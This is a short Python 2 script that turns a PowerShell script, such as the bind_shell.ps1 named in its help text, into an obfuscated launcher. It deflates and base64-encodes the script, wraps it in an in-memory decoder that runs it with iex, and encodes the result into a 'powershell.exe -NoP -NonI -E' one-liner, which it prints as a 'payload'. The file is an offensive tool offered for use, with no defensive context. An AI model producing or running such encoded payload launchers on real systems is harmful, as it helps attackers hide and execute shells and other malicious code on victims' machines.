#!/usr/bin/python
import argparse
import base64
import zlib

blob = 'powershell.exe -NoP -NonI -E "{}"'

ps1_comment_decoder_stage = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('{}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"

def deflate_and_base64_encode( string_val ):
    zlibbed_str = zlib.compress( string_val )
    compressed_string = zlibbed_str[2:-4]
    return base64.b64encode( compressed_string )

def generate_b64_oneliner(ps1_buf):
    return base64.b64encode(ps1_buf.encode('utf-16')[2:])


def main():
    parser = argparse.ArgumentParser(description='Generate bat file from powershell script')
    parser.add_argument('--script-path', dest='script_path', action='store', help='path to powershell script. ex bind_shell.ps1', required=True)
    parser.add_argument('--launch-string', dest='launch_string', action='store', help='powershell command to append to script')
    #parser.add_argument('--compress', dest='compress', action='store_true', help='compress (deflate) script')

    args = parser.parse_args()
    
    powershell_script = open(args.script_path).read()

    if args.launch_string is not None:
        powershell_script += '\r\n' + args.launch_string

    stage = ps1_comment_decoder_stage.format(deflate_and_base64_encode(powershell_script))

    res = ''
    #if args.compress is not True:
    #    res = blob.format(generate_b64_oneliner(powershell_script))
    #else:
    res = blob.format(generate_b64_oneliner(stage))
    print 'Payload length:', len(res)
    print res


if __name__ == '__main__':
    main()